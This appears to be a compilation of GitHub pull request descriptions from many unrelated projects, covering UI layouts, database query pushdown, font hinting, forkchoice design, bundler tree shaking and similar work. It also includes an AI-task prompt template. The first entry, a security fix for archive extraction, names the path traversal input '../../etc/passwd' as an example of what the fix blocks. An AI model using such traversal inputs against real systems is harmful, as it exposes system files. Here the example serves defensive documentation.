author: anderender
body:
Security fix: Prevent malicious archives from extracting files outside the target directory using path traversal attacks.

Vulnerabilities addressed:
- Path traversal using ".." components (e.g., ../../etc/passwd)
- Absolute paths that could write anywhere on the filesystem
- Symlink attacks where files are extracted through symbolic links

Changes:
- Added Component import from std::path
- Implemented is_safe_path() helper function to validate paths:
  * Checks for ParentDir (..) components
  * Rejects absolute paths
  * Ensures paths stay within base directory
- Added path validation in extract_entry() function:
  * Validates entry.name before extraction
  * Performs canonical path resolution check
  * Returns error for unsafe paths with descriptive messages

The validation occurs before any filesystem operations, preventing malicious archives from compromising the system.

author: amilner42
body:
## Summary
Optimized the mobile UI layout to better utilize screen space on smaller devices (375x667 viewport) by reorganizing the action bar into a single horizontal row with compact, equal-sized buttons.

## Changes
**Mobile Layout:**
- ✨ Reorganized buttons into single horizontal row: Discard (left), Sort (center), Play (right)
- 📏 Discard and Play buttons now have equal fixed width (64px) for visual consistency
- 🔽 Reduced button sizes (text-xs, compact padding) to save space
- 📝 Compacted sort button text from "Sorting by X" to "Sort: X"
- 🎯 Aligned action bar padding with card padding (px-2) for visual alignment
- 📱 Moved sorting button from below cards to action bar (mobile only)

**Desktop Layout:**
- ✅ Unchanged - buttons remain right-aligned below cards
- ✅ Sorting button stays below cards as before

## Technical Implementation
- Changed mobile layout from CSS Grid to Flexbox with `justify-between`
- Action buttons use `w-16` class for fixed equal widths
- Maintained separate mobile/desktop layouts using Tailwind `sm:` breakpoints
- Sorting button conditionally rendered based on viewport size

## Testing
- ✅ All existing tests passing
- ✅ Code compiles without errors
- 🧪 Manual testing on mobile viewport (375x667) recommended

## Screenshots
Will be added after manual testing

Fixes #65

author: humorless
body:
This PR updates the defstyled clj-kondo analysis hook to correctly handle all permutations of the macro, resolving an issue: a runtime exception.

Bug Fixes: Resolved ClassCastException (java.lang.Boolean cannot be cast to clojure.lang.Associative)

The original hook implementation returned {:node true} in the branch where fn-tag was not a list (i.e., when the style definition lacked a function body).

clj-kondo expects a valid AST node (an Associative data structure) in the :node key. Returning a boolean caused the parser to fail at the namespace level.

Fix: The false branch now correctly returns the AST for the original node, preventing the exception.

author: nicktindall
body:
This PR implements tracking of the distribution of write loads for shards in the cluster.

We can't use an APM histogram for this because we want the histogram over the shards in the cluster, not a histogram of observed values over time.

To address that requirement I chose to use a [HdrHistogram](https://hdrhistogram.github.io/HdrHistogram/), a third party library that was already in use elsewhere. It's more expensive than our internal histogram implementation, but it gives us very accurate values for the write load percentiles with minimal overhead.

The metrics added include (for each ingestion node)

- the 50th, 90th, 95th, 99th and 100th percentile of shard write loads on the node
- the "prioritisation threshold" write-load, over which shards will be prioritised for movement in the event of a hot spot
- the count of shards that exceed the "prioritisation threshold"
- the sum of the shard write loads on each node (so we can compare it to the node write load values)

author: 3dfactor
body:
Hi,

I've started using **ninetyfive** recently (Supermaven refugee 😄) and noticed it lacks some of the quality-of-life features that other copmletion services have.

So, I've implemented two new commands: **`accept_word`** and **`accept_line`**. These allow users to map a keybind to accept the current suggestion either **word-by-word** or by accepting the **entire line**. Based on your discord, this is a requested feature that I believe will improve the workflow.

> Disclaimer: The initial code draft and documentation updates were generated with assistance from **Claude Sonnet 4.5**, which I then edited into the current working state.
---

### Known Issues

* The feature is **functional** and currently integrated into my personal workflow.
* **Known Issue:** Occasionally, after using `accept_word`, suggestions may temporarily stop until re-entering insert mode. I'll look for the cause as I continue working on it. I submitted this PR now to get initial feedback, suggestions or possible fixes.

---

### Contribution

I'm not expecting this PR to be merged immediately. I'm happy for it to serve as a **blueprint** or starting point for the project maintainers to implement a final version.

Since this is a community-requested feature, I would appreciate any **suggestions for improvement** from other contributors or users who might have a deeper understanding of the codebase, because I'm mainly a front-end dev.

---

### Future

Once this feature is integrated I'll probably try to implement ninetyfive as cmp source, so it can be used along with LSP suggestions.

author: sle3pyy
body:
This pull request introduces support for managing and filtering tools by their "active" status throughout both the backend and frontend, and improves the update logic for tools to prevent unintended field overwrites. The backend now exposes an endpoint to fetch only active tools, and the frontend uses this endpoint for the renter dashboard. Additionally, the supplier dashboard allows toggling a tool's active status directly. Comprehensive tests have been added to ensure these features work as intended.

**Backend: Active Tools Support**

* Added a new endpoint `/api/tools/active` in `ToolController` to return only active tools.
* Introduced the `getActive()` method in `ToolService` and its implementation in `ToolServiceImpl`, which uses the new `findByActiveTrue()` repository query. [[1]](diffhunk://#diff-4fee840dfd7bc5b833f3d5e9237479f9a1b00c3182214bc11d19bdc232725283R15) [[2]](diffhunk://#diff-dfe90b566e461c18ae813ce0cea25f9d0ef9b4ae0ee155c36fe298fff53f702fR58-R62)

**Backend: Improved Update Logic**

* Updated the `updateTool` method in `ToolServiceImpl` to only modify fields that are present in the input, preventing overwriting fields with null values.

**Frontend: Active Tools Filtering and Management**

* Changed the renter dashboard (`RenterDashboardPage.tsx`) to fetch only active tools using the new `getActiveTools` API method. [[1]](diffhunk://#diff-d911a83d3000cf46b0b3d54e80d54b3f9ea33a4db0af241c668f15d594ce8f12L8-R8) [[2]](diffhunk://#diff-d911a83d3000cf46b0b3d54e80d54b3f9ea33a4db0af241c668f15d594ce8f12L26-R30) [[3]](diffhunk://#diff-6cbe7b0f8d07e8d417b37e08ca4b29fe439ec4acae30e73af1f868a541d5fadeR108-R120)
* Added a "Set Active"/"Set Inactive" button to each tool card in the supplier dashboard, allowing suppliers to toggle the active status of their tools. [[1]](diffhunk://#diff-b1e11a4398a2fbd428f5bb2737dd219806da1da769234c297601919231803d74R8-R12) [[2]](diffhunk://#diff-b1e11a4398a2fbd428f5bb2737dd219806da1da769234c297601919231803d74R41-R48) [[3]](diffhunk://#diff-db7bab783a667175b608b67a6711461cf0b630521a3441fb57dbf9743dc03498R85-R97) [[4]](diffhunk://#diff-db7bab783a667175b608b67a6711461cf0b630521a3441fb57dbf9743dc03498R161)

**Testing: Coverage for New Features**

* Added backend unit tests for getting active tools and for updating only the active flag without affecting other fields. [[1]](diffhunk://#diff-4aac6b01da19a6c2d19b72b20a69532d6f440dd890b1c3deefa8e531497ce3f4R183-R198) [[2]](diffhunk://#diff-7f961334d5fd1ca617af47dd83ae0649c678ed175112e2e8340c19cbc64f4098R153-R181)
* Enhanced test setup and coverage in `ToolServiceTest` to support new functionality. [[1]](diffhunk://#diff-7f961334d5fd1ca617af47dd83ae0649c678ed175112e2e8340c19cbc64f4098R5-R6) [[2]](diffhunk://#diff-7f961334d5fd1ca617af47dd83ae0649c678ed175112e2e8340c19cbc64f4098R23-R24) [[3]](diffhunk://#diff-7f961334d5fd1ca617af47dd83ae0649c678ed175112e2e8340c19cbc64f4098R33-R35) [[4]](diffhunk://#diff-7f961334d5fd1ca617af47dd83ae0649c678ed175112e2e8340c19cbc64f4098R45-R51)

author: bwaite15104
body:
This PR adds the interactive lineage visualization frontend component using Cytoscape.js, completing the lineage visualization feature.

## Changes Made

- **Installed dependencies**: cytoscape, cytoscape-dagre, react-cytoscapejs, @types/cytoscape
- **Created LineageViewer component**: Interactive graph visualization with:
  - Zoom, pan, and fit controls
  - Three layout options: hierarchical, circular, force-directed
  - Node/edge styling based on type, drift status, and confidence
  - Click handlers for nodes and edges
- **Updated lineage page**: Replaced table view with interactive graph viewer
- **Added layout selector**: Control panel option to switch between layouts

## Features

- Interactive graph rendering with Cytoscape.js
- Visual styling for root nodes, drift nodes (high/medium/low severity)
- Edge styling based on confidence scores
- Multiple layout algorithms (hierarchical, circular, force-directed)
- Zoom and pan controls
- Node/edge click interactions

## Testing

- All Python tests pass (513 passed, 12 skipped)
- Code formatting and linting pass
- Frontend compiles successfully

This completes the frontend implementation that was deferred in the backend PR #48.

author: davemcnamara-arch
body:
When non-creators tried to lock in event details, the database RLS policy blocked the update but didn't throw an error. This caused:
- System message banner to appear (misleading users)
- Event status to remain 'planning' instead of 'scheduled'
- Event not appearing in 'today' section on events page

Changes made:
1. lockEventDetails(): Added .select() and empty data check
2. saveEventEdits(): Added empty data check (already had .select())
3. cancelEvent(): Added .select() and empty data check

All three functions now properly detect when RLS blocks an update and show clear error messages to users.

Fixes the issue where event details appeared locked but status didn't update and event didn't show in 'today' collapsible.

body:
Adds proper error handling for file and mutex operations in Write-Log, plus comprehensive documentation updates.

### Error Handling
- Wrap log rotation (Get-Item, Copy-Item, Remove-Item) in try-catch with early return on failure
- Wrap Out-File operations with proper error reporting
- Add finally block for mutex release to prevent deadlocks on write failures

### Documentation
- **Write-Log.ps1**: Enhanced comment-based help with detailed parameter descriptions, INPUTS/OUTPUTS sections, and 4 examples including parallel logging
- **README.md**: Added installation, usage examples, log format specification, and parameter reference table

### Example
```powershell
# Error handling now surfaces meaningful messages
Write-Log -text "Test" -level INFO -log "/nonexistent/path/app.log"
# Write-Log: Failed to write to log file: Could not find a part of the path...

# Mutex is properly released even on failure
Write-Log -text "Safe write" -level INFO -log "C:\Logs\app.log" -UseMutex $true
```

Implements buyer-facing case tracking for returns and complaints. Buyers can view a filterable list of their cases and access details including status, seller response, and linked refunds.

## Changes

### Application Layer
- Added `GetBuyerReturnRequestQuery` handler to `ReturnRequestService` with linked refund lookup via `IRefundRepository`
- New DTOs: `BuyerCaseDetailsDto`, `LinkedRefundDto`

### UI Layer
- **`/Buyer/Cases`** - Case list with status/date filtering, showing case ID, order ref, seller, type, created date, status
- **`/Buyer/CaseDetails/{caseId}`** - Full case view with request data, seller response, items, and linked refund table
- Updated Buyer Dashboard with "Returns & Complaints" navigation card

### ViewModels
- `BuyerCaseDetailsViewModel`, `BuyerCaseSummaryViewModel`, `LinkedRefundViewModel`

## Screenshots

### Buyer Dashboard
![Dashboard](https://github.com/user-attachments/assets/1cf73e79-c922-4ed5-9038-b3556e86cd1e)

> *This section details on the original issue you should resolve*

> <issue_title>View and track my cases as buyer</issue_title>
> <issue_description>## Epic: Returns, Complaints & Disputes
> 
> ## User Story
> As a buyer I want to see a list and details of my return and complaint cases so that I can track their status and outcomes.
> 
> ## Acceptance Criteria
> - Given I am a logged-in buyer, when I open the 'Returns & complaints' section, then I see a list of my cases with basic information (case ID, order reference, seller name, type, created date, current status).
> - Given I have at least one case, when I open its details, then I see the original request data, current status, resolution (if any), linked refund information (if any), and the messaging thread.
> - Given a case status changes (e.g. from 'Pending seller review' to 'In progress' or 'Resolved'), when I later open my case list, then I see the updated status.
> - Given a case is resolved, when I open it, then I can see whether it was approved, partially approved, or rejected, including the seller's final decision summary.
> 
> ## Notes
> - Filtering by status and date range is recommended but may be simplified in MVP.
> - Access must be restricted so that buyers cannot see cases belonging to other buyers.
> - Resolutions should surface any linked payment/refund identifiers from the payments module.

author: antimora
body:
This PR adds 256-byte alignment padding to the burnpack file format, enabling efficient memory-mapped (mmap) zero-copy tensor loading. Previously, tensor data was stored sequentially without padding, causing `as_slice()` to fail on unaligned data when using mmap and static region mapping.

**Problem**

  The burnpack format stored tensor data without alignment:
  - bytemuck::try_cast_slice() requires properly aligned pointers
  - mmap'd tensors at arbitrary offsets couldn't be zero-copied
  - Had to copy data to aligned heap allocations, negating mmap benefits
  - Coudn't use burnpack file embedded to static regions to be referenced via Cube's Bytes custom allocations into TensorData

 **Solution**

Align all tensor data to 256-byte boundaries—the industry consensus used by GGUF, MLX, ncnn, MNN, and NVIDIA formats.

**Why 256 bytes?**
  - Covers all primitive type alignments (f64 needs 8, f32 needs 4, etc.)
  - Cache-line friendly (64-128 byte cache lines)
  - GPU memory alignment (CUDA prefers 256-byte for coalesced access)
  - Future-proof for wider SIMD (AVX-512, future AVX-1024)
  - Negligible overhead for typical tensor sizes

### Checklist

- [x] Confirmed that `cargo run-checks` command has been executed.
- [x] Made sure the book is up to date with changes in this PR.

### Related Issues/PRs

https://discord.com/channels/1038839012602941528/1091796857996451942/1444748125943103509

### Changes

| File               | Change                                                                               |
|--------------------|--------------------------------------------------------------------------------------|
| base.rs            | Added TENSOR_ALIGNMENT = 256 constant and aligned_data_section_start() function      |
| writer.rs          | Pad after metadata to align data section; pad between tensors to 256-byte boundaries |
| reader.rs          | Use aligned_data_section_start() to calculate correct data section offset            |
| mod.rs             | Updated format documentation to reflect alignment                                    |
| tests/alignment.rs | Added 12 comprehensive alignment tests                                               |

**File Format (Updated)**
```
┌──────────────────────────────────┐
│  Header (10 bytes)               │
├──────────────────────────────────┤
│  Metadata (CBOR)                 │
├──────────────────────────────────┤
│  [padding to 256-byte boundary]  │  ← NEW
├──────────────────────────────────┤
│  Tensor Data Section             │
│  [tensor1][pad][tensor2][pad]... │  ← Each tensor 256-byte aligned
└──────────────────────────────────┘
```

 **Backward Compatibility**

  - Reading old files: Old files without padding will still work—the reader uses offsets from metadata
  - Format version: Kept at 0x0001 since padding is transparent to older readers

### Testing

Added 12 new tests in alignment.rs:
- test_aligned_data_section_start_is_always_aligned - Verifies alignment function for metadata sizes 0-1024
- test_data_section_alignment - Data section starts at 256-byte aligned position
- test_first_tensor_absolute_position_aligned - First tensor's absolute file position is aligned
- test_all_tensors_absolute_positions_aligned - All tensors in multi-tensor files are aligned
- test_alignment_with_minimal_padding - Edge cases around padding calculations
- test_padding_bytes_are_zeros - Padding bytes are zeroed
- test_alignment_covers_all_primitive_types - 256 divisible by all type alignments
- test_aligned_tensor_data_readable / test_aligned_f64_tensor_data_readable - Data integrity
- test_round_trip_maintains_alignment - Write→read preserves data
- test_tensor_relative_offsets_are_aligned - Relative offsets within data section are aligned
- test_file_io_preserves_alignment - File I/O maintains alignment

author: seunghui-park
body:
## 🎯 변경 사항

근로자 홈 화면 UI 및 API 연동을 구현했습니다. Figma 디자인을 기반으로 환영 메시지, 미결 전자계약, 최근 급여 내역, 금일 근태 내역 섹션을 구현하고, TanStack Query와 Zustand를 활용하여 실제 API 데이터를 연동했습니다.

### 주요 기능

1. **홈 화면 UI 구현**
   - 환영 메시지 섹션 (사용자 이름 동적 표시)
   - 미결 전자계약 섹션 (조건부 렌더링 - 데이터 있을 때만 표시)
   - 최근 급여 내역 섹션 (데이터 없을 때 "없습니다" 메시지 표시)
   - 금일 근태 내역 섹션 (데이터 없을 때 "없습니다" 메시지 표시)
   - 하단 네비게이션 바 (홈, 출근/퇴근, 급여, 마이페이지)

2. **API 연동**
   - `GET /v1/employees/me/home` API 연동
   - TanStack Query를 활용한 데이터 페칭 및 캐싱
   - 로딩 상태 및 에러 처리

3. **조건부 렌더링**
   - 미결 전자계약: `count > 0`일 때만 카드 표시
   - 최근 급여 내역: `recentSalary`가 `null`이어도 섹션 표시 (없습니다 메시지)
   - 금일 근태 내역: `todayAttendance`가 `null`이어도 섹션 표시 (없습니다 메시지)

4. **데이터 표시**
   - 미결 전자계약: 근로계약서/안전교육일지 버튼 동적 생성
   - 최근 급여: 현장명, 지급일, 실지급액 (천단위 구분)
   - 금일 근태: 출근/퇴근/결근 상태, 시간, 지각 여부

### 기술 스택

- **TanStack Query**: 데이터 페칭 및 캐싱
- **Zustand**: 사용자 정보 상태 관리 (authStore)
- **Next.js App Router**: 라우팅 및 레이아웃

### 파일 변경 사항

#### 신규 파일

- `src/types/home.ts` - 홈 화면 API 타입 정의
- `src/lib/api/home.ts` - 홈 화면 API 함수
- `src/hooks/useHomeData.ts` - 홈 화면 데이터 조회 Hook
- `src/components/common/BottomNavigation.tsx` - 하단 네비게이션 바 컴포넌트

#### 수정 파일

- `src/app/(main)/home/page.tsx` - 홈 화면 페이지 구현 및 API 연동
- `src/app/(main)/layout.tsx` - 하단 네비게이션 바 적용
- `src/components/common/index.ts` - BottomNavigation export 추가

## 📝 사용 방법

### 1. 홈 화면 접근

1. 로그인 후 `hasProfileImage: true`인 경우 자동으로 `/home`으로 이동
2. 하단 네비게이션 바의 "홈" 버튼 클릭

### 2. 데이터 표시

- **미결 전자계약**: API에서 `pendingContracts.count > 0`인 경우에만 카드 표시
- **최근 급여 내역**: API에서 `recentSalary`가 있으면 데이터 표시, 없으면 "최근 급여 내역이 없습니다." 메시지
- **금일 근태 내역**: API에서 `todayAttendance`가 있으면 데이터 표시, 없으면 "금일 근태 내역이 없습니다." 메시지

### 3. API 흐름

```
1. GET /v1/employees/me/home
   → 홈 화면 정보 조회
   → 응답:
     - pendingContracts: { count, items[] }
     - recentSalary: { payrollId, siteId, siteName, payDate, netPay } | null
     - todayAttendance: { siteId, siteName, checkInTime, checkOutTime, status, isLate } | null

2. TanStack Query 캐싱
   - queryKey: ["home"]
   - 자동 리페칭 및 캐싱 관리
```

### 4. 하단 네비게이션 바

- 모든 (main) 레이아웃 페이지에 자동 적용
- 현재 경로에 따라 활성화 상태 표시
- Safe area 적용 (iOS 하단 네비게이션)

## ✅ 테스트

- [x] 홈 화면 UI 렌더링 (Figma 디자인 반영)
- [x] 환영 메시지에 사용자 이름 표시 (authStore)
- [x] 미결 전자계약 섹션 조건부 렌더링 (count > 0일 때만)
- [x] 미결 전자계약 버튼 동적 생성 (CONTRACT/SAFETY_LOG 타입별)
- [x] 최근 급여 내역 데이터 표시 (있을 때)
- [x] 최근 급여 내역 없음 메시지 표시 (없을 때)
- [x] 금일 근태 내역 데이터 표시 (있을 때)
- [x] 금일 근태 내역 없음 메시지 표시 (없을 때)
- [x] 금일 근태 상태 표시 (출근/퇴근/결근)
- [x] 지각 여부 표시
- [x] API 로딩 상태 표시
- [x] API 에러 상태 표시
- [x] 하단 네비게이션 바 렌더링
- [x] 하단 네비게이션 바 활성화 상태 표시
- [x] 하단 네비게이션 바 라우팅 동작
- [x] Safe area 적용 (iOS)
- [x] 반응형 레이아웃 (최대 너비 353px)

## 🔗 관련 이슈

- Jira: resolves BU-224
- resolves #29

Role & Scope
Role: Senior architecture and delivery engineer.
Mission: Analyze the legacy system and design a greenfield replacement (not an in-place refactor).
Workspace: Create relevant project files under oswe-mini-m19a2s435-org.

Object & Inputs
Object: [issue_project]
Input assets (optional): Codebase, APIs/Schemas, logs, monitoring, test commands, run recordings, etc. [[links or summaries]]

Activities (Analyze → Conclude)
3.1 Clarification & Data Collection

List missing data/assumptions.
Draft a collection checklist: code, logs, traffic, DB snapshots.
3.2 Background Reconstruction (Model Output)

From visible assets, infer legacy business context, core flows, boundaries, dependencies.
Highlight uncertainties.
3.3 Current-State Scan & Root-Cause Analysis

Identify issues by category: Functionality, Performance, Reliability, Security, Maintainability, Cost.
Provide a table: Category | Symptom | Likely Root Cause | Evidence / Needed Evidence.
For high-priority issues: give hypothesis chains and validation methods; if issues are known, provide fix paths with causal chains.
3.4 New System Design (Greenfield Replacement)

Target state: capability boundaries, service decomposition, unified state machine, idempotency/retry/timeout/circuit-breaker strategies, compensation (Saga/outbox).
Architecture and data flow: prose plus ASCII diagrams; key interfaces/Schemas/validation (including field constraints).
Migration and parallel run (if needed): read/write cutover, backfill, dual-write/shadow traffic, rollback paths.
3.5 Testing & Acceptance (Dynamically Generated)

Derive at least 5 repeatable integration tests from crash points/risks.
Each test case: Target issue | Preconditions/Data | Steps | Expected outcome | Observability assertions (logs/metrics/events).
Coverage: idempotency; retry with backoff; timeout propagation/circuit breaking; compensation/Saga/outbox; audit/reconciliation; healthy path. If a risk does not exist, state why.
Acceptance criteria: Given-When-Then or quantified SLO/SLA.
AI Output Requirements (Appointment Scenario Focus)
Lifecycle mapping: init → in-progress → success/failure; mark crash points (uncaught exceptions, timeout propagation, missing idempotency).
Root-cause evidence: stack/log snippets; state snapshots (request ID, calendar response, DB state).
Improvements: idempotency keys; retry + backoff; circuit breaker/timeout; transactional outbox or Saga compensation; unified state machine.
Integration tests: as per 3.5.
Structured logging schema: unique appointment/request ID; sensitive fields masked.
One-click test fixture: single command runs all scenarios; outputs pass/fail and key metrics (success rate, retry counts, idempotency assertions).

src/ # v2 integration/adaptation runtime code

data/ # test_data.json, expected_postchange.json

README.md # how to run/interpret, limits, rollout strategy

Output Formatting

body: Major changes: The whole logic is based on the idea that it doesn't matter how you reach the segment-level identifiers. i.e though ePBS introduces a separate envelope object, but the same segment structure can be followed. So the difference between a envelope(full block)/ empty block is which state is read from that block. One of the ways to do that is by following the existing pattern of keeping a chunk of the Store fields inside Chainlink 1. ChainLink dual statefield ``` block_state: Option>>, // Pre-execution (after beacon block STF) execution_payload_state: Option>>, // Post-execution (after payload STF) ``` The changed structure of empty/full block pretty much behave as siblings if it is looked from view of part of forkchoice calculation which depends on reading parent information. - with epbs, to get correct forchoice results, its important to know both which variant the block itself is + which block will it be effecting(for eg: not just the insertion of envelope/empty block have a type but also what it is inserted into has a type i.e the parent block can be full as well as empty) so the the most common structure that is going to happen is: ``` Segment 0: ──► [Parent X] │ ├──► Segment 1: [Empty A] ──► [Empty B] │ ▲ │ │ │ unfinalized_locations_empty["A"] = (seg:1, pos:0) │ └──► Segment 2: [Full A] ▲ │ unfinalized_locations_full["A"] = (seg:2, pos:0) ``` - both weight propagation purposes as well as the insertion purpose of full/empty block of arrival, the choice of introducing dual maps is much easier than differentiation at `unfinalized_block` level or using `chain_link` fields. - the key currently for both the map is `block_root`. A previous approach was made to keep unfinalized_locations_full maps key as `execution_hash` and unfinalized_locations_empty through `block_root`. But there was significant overhead in terms of number of conversion calla/reverse lookup for hash to root and viceversa. plus as only one variant of full/empty per blockroot can reach till forkchoice, there is ideally no problem with having the same keys. - a way to move forward with the changes is to look at in which scenarios(insertion into segment, calculation supporting vote, tiebraker , weight propagtion/childern filter/setting `ForkChoicePayloadStatus`) empty vs full is preferred across spec and current code.

author: gaspardpetit
body:
This pull request refactors the CLI implementation for the `verbatim` tool by modularizing argument parsing, configuration building, and execution logic into dedicated helper modules. The main entry point (`main.py`) is simplified by delegating responsibilities to new files, improving maintainability and readability. No functional changes to CLI options are introduced; instead, the code is reorganized for clarity and separation of concerns.

### CLI argument parsing and configuration (most important):

* Moved CLI argument parsing logic from `main.py` to a new `verbatim_cli/args.py` module, encapsulating argument definitions and custom actions in the `build_parser` function.
* Extracted configuration building and output format selection to `verbatim_cli/configure.py`, providing helper functions such as `make_config`, `make_write_config`, `build_output_formats`, and `build_prefixes`.

### Execution logic refactoring:

* Moved audio source creation and execution logic to `verbatim_cli/run_single.py`, defining `build_audio_sources` and `run_execute` for single-file processing.

### Main entry point simplification:

* Updated `main.py` to use the new helper modules for argument parsing, configuration, and execution, removing inline logic and reducing complexity. [[1]](diffhunk://#diff-4a25e80b5dc75aa65bd385e39549120342d4f139805951475a3e48a5ea1e6dc6L1-R27) [[2]](diffhunk://#diff-4a25e80b5dc75aa65bd385e39549120342d4f139805951475a3e48a5ea1e6dc6L157-R45) [[3]](diffhunk://#diff-4a25e80b5dc75aa65bd385e39549120342d4f139805951475a3e48a5ea1e6dc6L188-R63) [[4]](diffhunk://#diff-4a25e80b5dc75aa65bd385e39549120342d4f139805951475a3e48a5ea1e6dc6L234-R85)

These changes collectively improve the codebase structure and make it easier to maintain and extend the CLI functionality.

author: lokv010
body:
The issue was that the MCP server was creating a new Server instance for each new session/transport, which caused the 424 (Failed Dependency) error when OpenAI Agent Builder tried to connect.

Changes:
- Create a single MCP server instance at application startup
- Reuse the server instance across all transport connections
- Each session still gets its own transport, but they all connect to the same server instance

This follows the proper pattern for MCP servers using HTTP/SSE transport and resolves the initialization issues that were preventing OpenAI Agent Builder from connecting.

Tested with curl and verified:
- Server properly handles initialization requests
- Session management works correctly
- Tools list endpoint returns available tools
- Server responds with proper SSE format

## Story 1.10: Auto-Create Default Project

**Status:** Ready for Done ✅

### Summary

Implements automatic default project creation during account activation (both Free plan and Stripe webhook paths). When a user activates their account, the system creates a first project named "My First Project" with a unique URL tag.

### Key Features

✅ **Atomic project creation** - Project created in same transaction as account activation
✅ **Retry logic** - Up to 5 attempts with race condition handling via PostgreSQL unique constraints
✅ **Idempotency** - Duplicate activations safely handled
✅ **Error response differentiation** - HTTP 500 for manual activation failures, HTTP 200 for webhooks (prevents Stripe retry storms)
✅ **100% test coverage** - Critical paths fully tested with unit and integration tests

### Architecture Highlights

- **Service Decomposition:** ProjectCreationService → AccountActivationService → StripeWebhookService
- **Entity/Model Separation:** Perfect adherence to repository pattern
- **Transaction Safety:** ITransactionService.Required() with explicit Complete() calls
- **Modern C# Patterns:** Primary constructors, collection expressions, file-scoped namespaces

author: rjwalters
body:
## Summary

- Extract right-table-only predicates from SEMI/ANTI JOIN conditions and push to right-side scan for index selection
- Add build-time filtering in hash semi/anti-join as fallback when scan doesn't filter rows
- Foundation for index-based optimization of IN subqueries (TPC-C Stock-Level)

## Problem

For IN subquery to SEMI JOIN transformations, the subquery's WHERE clause predicates (e.g., `s_w_id = ? AND s_quantity < ?`) were combined into the JOIN condition but not pushed to the right-side scan. This prevented index usage on predicates like `s_quantity < ?`.

```sql
-- TPC-C Stock-Level query
SELECT COUNT(DISTINCT ol_i_id) FROM order_line 
WHERE ol_w_id = ? AND ol_d_id = ? AND ol_o_id >= ? AND ol_o_id < ? 
AND ol_i_id IN (SELECT s_i_id FROM stock WHERE s_w_id = ? AND s_quantity < ?)
```

## Solution

Two-level optimization:

1. **Scan-level pushdown** (`join_scan.rs`): For SEMI/ANTI joins, extract right-only predicates from JOIN condition and pass them to the right-side scan. This enables index selection.

2. **Build-time filtering** (`hash_semi_join.rs`, `hash_anti_join.rs`): Partition filter predicates into right-only and cross-table. Apply right-only predicates during hash table build phase to reduce memory usage.

## Changes

- `join_scan.rs`: Add `extract_right_only_predicates()` to extract and push predicates for SEMI/ANTI joins
- `hash_semi_join.rs`: Add `partition_filter_predicates()` for build-time filtering
- `hash_anti_join.rs`: Same optimization for NOT IN subqueries  
- `where_pushdown/mod.rs`: Export `extract_referenced_tables_branch`

## Test plan

- [x] All subquery tests pass
- [x] TPC-C Stock-Level benchmark runs correctly
- [x] Predicates correctly extracted and pushed (verified with debug output)
- [ ] Full CI test suite

Closes #3130

author: jimbobsquarepants
body:
### Prerequisites

- [x] I have written a descriptive pull-request title
- [x] I have verified that there are no overlapping [pull-requests](https://github.com/SixLabors/Fonts/pulls) open
- [x] I have verified that I am following matches the existing coding patterns and practice as demonstrated in the repository. These follow strict Stylecop rules :cop:.
- [x] I have provided test coverage for my change (where applicable)

### Description
<!-- A description of the changes proposed in the pull-request -->
This pull request introduces several important improvements and bug fixes to the font rendering engine, focusing on glyph positioning, kerning, and TrueType hinting. The changes enhance correctness, efficiency, and maintainability, particularly in the handling of glyph state and the implementation of the TrueType interpreter. Additionally, some code modernizations and new test reference images are included.

### Glyph Positioning and Kerning Improvements

* Added explicit tracking of glyph positioning (`IsPositioned`) and kerning (`IsKerned`) states in `GlyphShapingData`, preventing redundant processing and ensuring accurate state propagation during glyph shaping and kerning. The kerning logic now checks and sets `IsKerned` to avoid double application. 
* Optimized glyph positioning updates in `TextLayout` by avoiding redundant updates for consecutive `TextRun`s using the same font. 

### TrueType Interpreter Bug Fixes and Enhancements

* Corrected several subtle bugs in the `TrueTypeInterpreter`, including:
  - Proper toggling of the `OnCurve` flag for the correct point index. 
  - Correctly setting the `iupXCalled` flag in the IUP instruction. 
  - Fixed logic for determining if any zone pointer is in the twilight zone. 
  - Corrected the use of zone pointers in vector calculations. 
* Completely reimplemented the `Round` function to precisely match FreeType v40's rounding semantics, ensuring correct and consistent rendering across all rounding modes. 

### Documentation and Code Modernization

* Expanded and clarified the documentation for the `TrueTypeInterpreter`, detailing the reference model and behavioral expectations for modern and legacy fonts. 
* Modernized array initialization and usage of collection expressions for improved readability and performance in kerning table loading code. 
### Testing

* Added new reference output images for hinting robustness tests using Arial, OpenSans, and Tahoma to validate rendering changes.

author: lukesandberg
body:
Use our new side effects analysis to statically analyze modules and integrate this into the `remove unused imports` (aka Inner Graph Tree Shaking) logic.

If a module and its transitive dependencies have no side effects based on either declarations or static analysis then we can drop all 'ModuleEvaluation' imports.  This can enhance tree shaking and bundle optimization.

From a performance perspective this risky since we need to compute transitive side effects prior to trimming edges.  That task is just aggregating a bunch of cached turbo tasks but it might still be expensive.  On the other hand trimming edges will speed up chunking and code generation as we have less code to process.  To see how this shakes out i built `vercel-site` both ways.

```
~/projects/front/apps/vercel-site (main *)$ hyperfine -p 'rm -rf .next' -w 2 -r 10  'TURBOBPACK_REMOVE_UNUSED_SIDE_EFFECTS=1 pnpm next build --turbopack --experimental-build-mode=compile' 'TURBOBPACK_REMOVE_UNUSED_SIDE_EFFECTS=0 pnpm next build --turbopack --experimental-build-mode=compile'
Benchmark 1: TURBOBPACK_REMOVE_UNUSED_SIDE_EFFECTS=1 pnpm next build --turbopack --experimental-build-mode=compile
  Time (mean ± σ):     46.122 s ±  1.453 s    [User: 316.651 s, System: 48.030 s]
  Range (min … max):   43.149 s … 48.129 s    10 runs

Benchmark 2: TURBOBPACK_REMOVE_UNUSED_SIDE_EFFECTS=0 pnpm next build --turbopack --experimental-build-mode=compile
  Time (mean ± σ):     45.864 s ±  1.754 s    [User: 321.621 s, System: 48.937 s]
  Range (min … max):   44.629 s … 50.647 s    10 runs

Summary
  TURBOBPACK_REMOVE_UNUSED_SIDE_EFFECTS=0 pnpm next build --turbopack --experimental-build-mode=compile ran
    1.01 ± 0.05 times faster than TURBOBPACK_REMOVE_UNUSED_SIDE_EFFECTS=1 pnpm next build --turbopack --experimental-build-mode=compile
```

So definitely a performance regression, I am adding a new 'global summary' task in the critical path

But how much does it save?

The number of unused references for `vercel-site` goes from 2144 to 21925 (!!), but these are mostly just trimming our parallel `Evaluation` edges, the real idea is number of trimmed modules which goes from 1802 -> 2165 (out of 48783 total) which is a nice if small win.   From scanning the names these are mostly icons and date time helper modules.

We do tend to see large wins on benchmarks due to silly patterns they have.

author: copilot
body:
The Nightly workflow fails intermittently when downloading the musl cross-compiler from musl.cc for aarch64 builds due to unstable repository access.

### Changes

- **Replaced musl.cc download with cross-rs** for aarch64-unknown-linux-musl target
  - Install cross from GitHub releases instead of downloading toolchain tarball
  - Use `cross build` for aarch64, keeping `cargo build` for x86_64
  - Remove manual linker configuration (cross handles this internally)

